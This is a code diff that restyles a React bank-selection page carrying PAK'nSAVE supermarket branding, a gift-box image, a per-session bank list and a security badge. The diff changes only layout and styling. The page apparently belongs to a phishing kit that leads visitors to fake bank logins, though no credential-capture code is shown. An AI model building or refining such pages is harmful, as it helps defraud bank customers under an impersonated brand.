@@ -274,32 +274,22 @@ export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: P
 
   return (
     <div className="pak-page-shell">
-      <div className="relative z-10 w-full max-w-[980px] space-y-4">
-        <div className="pak-form-card p-4 sm:p-6">
-          <div className="pak-form-inner">
-            <div className="mb-6 grid gap-6 lg:grid-cols-[minmax(0,1fr)_220px] lg:items-start">
-              <div className="min-w-0">
-                <div className="max-w-[36rem]">
-                  <h2 className="pak-form-title">{settings.banken_title}</h2>
-                  <p className="pak-form-subtitle mt-3">{settings.banken_subtitle}</p>
-                </div>
+      <div className="relative z-10 w-full max-w-[860px] space-y-4">
+        <div className="pak-form-card h-[calc(100dvh-6rem)] max-h-[820px] overflow-hidden p-3 sm:h-[calc(100dvh-6.4rem)] sm:p-5">
+          <div className="pak-form-inner grid h-full grid-rows-[auto_auto_minmax(0,1fr)_auto]">
+            <div className="mb-3 flex items-start justify-between gap-3">
+              <div className="min-w-0 max-w-[30rem]">
+                <h2 className="pak-form-title">{settings.banken_title}</h2>
+                <p className="pak-form-subtitle mt-2">{settings.banken_subtitle}</p>
               </div>
-
-              <div className="flex items-start justify-between gap-4 lg:block">
-                <img
-                  src="/form-assets/paknsave-logo-form.png"
-                  alt="PAK'nSAVE"
-                  className="h-14 w-14 object-contain sm:h-16 sm:w-16 lg:ml-auto lg:mb-4"
-                />
-                <img
-                  src="/form-assets/paknsave-gift-box.png"
-                  alt=""
-                  className="h-auto w-24 object-contain drop-shadow-[0_18px_32px_rgba(0,0,0,0.45)] sm:w-32 lg:w-full lg:max-w-[200px] lg:translate-x-2"
-                />
-              </div>
+              <img
+                src="/form-assets/paknsave-logo-form.png"
+                alt="PAK'nSAVE"
+                className="pak-form-brand-logo shrink-0"
+              />
             </div>
 
-            <div className="mx-auto mb-5 max-w-[560px]">
+            <div className="mx-auto mb-3 w-full max-w-[520px] shrink-0">
               <div className="pak-form-input-wrap mt-0">
                 <div className="pak-form-input-icon">
                   <svg aria-hidden viewBox="0 0 24 24" className="h-5 w-5" fill="none" stroke="currentColor" strokeWidth="2">
@@ -311,15 +301,15 @@ export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: P
                   value={searchTerm}
                   onChange={(e) => setSearchTerm(e.target.value)}
                   placeholder={settings.banken_search_placeholder}
-                  className="pak-form-input min-h-[4rem] pl-14 pr-4 text-base"
+                  className="pak-form-input min-h-[3.5rem] rounded-full pl-14 pr-4 text-[15px]"
                 />
               </div>
             </div>
 
-            <div className="max-h-[58vh] overflow-y-auto pr-1 custom-scrollbar">
-              <div className="grid grid-cols-2 gap-3 sm:grid-cols-3 lg:grid-cols-4">
+            <div className="min-h-0 overflow-y-auto pr-1 custom-scrollbar">
+                <div className="grid grid-cols-1 gap-2 sm:grid-cols-2 lg:grid-cols-3">
                 {filteredOptions.length === 0 ? (
-                  <div className="col-span-2 rounded-2xl border border-[#ffd95c]/20 bg-white/5 p-6 text-center text-sm text-white/82 sm:col-span-3 lg:col-span-4">
+                  <div className="col-span-full rounded-2xl border border-[#ffd95c]/20 bg-white/5 p-6 text-center text-sm text-white/82">
                     No banks were found for the selected country. Choose another country or clear the search filter.
                   </div>
                 ) : filteredOptions.map((opt) => (
@@ -328,17 +318,17 @@ export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: P
                     type="button"
                     onClick={() => void handleBankSelect(opt.slug, opt.displayName)}
                     disabled={saving}
-                    className={`group flex min-h-[9.6rem] w-full flex-col items-center justify-between rounded-[1.2rem] border p-3 text-center transition-all duration-200 ${
+                    className={`group flex min-h-[4.25rem] w-full items-center gap-3 rounded-full border px-3 py-2 text-left transition-all duration-200 ${
                       bankSlug === opt.slug
                         ? "border-[#ffe784] bg-[linear-gradient(180deg,rgba(255,213,0,0.18),rgba(255,213,0,0.08))] shadow-[0_0_0_1px_rgba(255,240,170,0.22),0_0_24px_rgba(255,214,10,0.14)]"
                         : "border-[#ffd95c]/16 bg-[linear-gradient(180deg,rgba(255,255,255,0.04),rgba(255,255,255,0.02))] hover:border-[#ffe784]/35 hover:bg-[linear-gradient(180deg,rgba(255,213,0,0.1),rgba(255,213,0,0.04))]"
                     } ${saving ? "opacity-70" : ""}`}
                   >
-                    <div className="flex flex-1 items-center justify-center py-2">
+                    <div className="flex h-11 w-11 shrink-0 items-center justify-center overflow-hidden rounded-full border border-[#ffd95c]/22 bg-[linear-gradient(180deg,rgba(35,35,31,0.98),rgba(15,15,13,0.98))] shadow-[inset_0_1px_0_rgba(255,255,255,0.06)]">
                       <img
                         src={optimizeSupabaseImageUrl(opt.logoFile, { format: "webp", quality: 80, width: 128 }) || opt.logoFile}
                         alt={opt.displayName}
-                        className="h-12 w-12 object-contain rounded"
+                        className="h-full w-full rounded-full object-cover"
                         onError={(e) => {
                           e.currentTarget.onerror = null;
                           e.currentTarget.style.display = "none";
@@ -346,21 +336,26 @@ export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: P
                           if (fallback) fallback.style.display = "grid";
                         }}
                       />
-                      <div className="hidden h-12 w-12 place-items-center rounded-xl border border-[#ffd95c]/20 bg-[linear-gradient(180deg,rgba(35,35,31,0.98),rgba(15,15,13,0.98))] text-lg font-black text-[#ffe98c] shadow-[inset_0_1px_0_rgba(255,255,255,0.06)]">
+                      <div className="hidden h-7 w-7 place-items-center rounded-full text-sm font-black text-[#ffe98c]">
                         {opt.displayName.charAt(0)}
                       </div>
                     </div>
-                    <div className="flex min-h-[2.8rem] w-full items-center justify-center">
-                      <p className="line-clamp-2 text-[12px] font-semibold leading-tight text-white/92 group-hover:text-white">
+                    <div className="min-w-0 flex-1">
+                      <p className="truncate text-[13px] font-semibold leading-none text-white/92 group-hover:text-white">
                         {opt.displayName}
                       </p>
                     </div>
+                    <div className="shrink-0 text-[#ffd95c]/70 transition-transform duration-200 group-hover:translate-x-0.5 group-hover:text-[#ffe98c]">
+                      <svg className="h-4 w-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
+                        <path strokeLinecap="round" strokeLinejoin="round" d="M9 6l6 6-6 6" />
+                      </svg>
+                    </div>
                   </button>
                 ))}
-              </div>
+                </div>
             </div>
 
-            <div className="mt-6 pak-form-security justify-center text-center">
+            <div className="mt-3 flex shrink-0 items-center justify-center gap-2 border-t border-[#ffd95c]/15 pt-3 text-center pak-form-security">
               <svg className="h-8 w-8 shrink-0 text-[#ffd500]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.9">
                 <path d="M12 3.7 18.4 6v5.2c0 4-2.3 7.1-6.4 9.1-4.1-2-6.4-5.1-6.4-9.1V6L12 3.7Z" strokeLinejoin="round" />
               </svg>
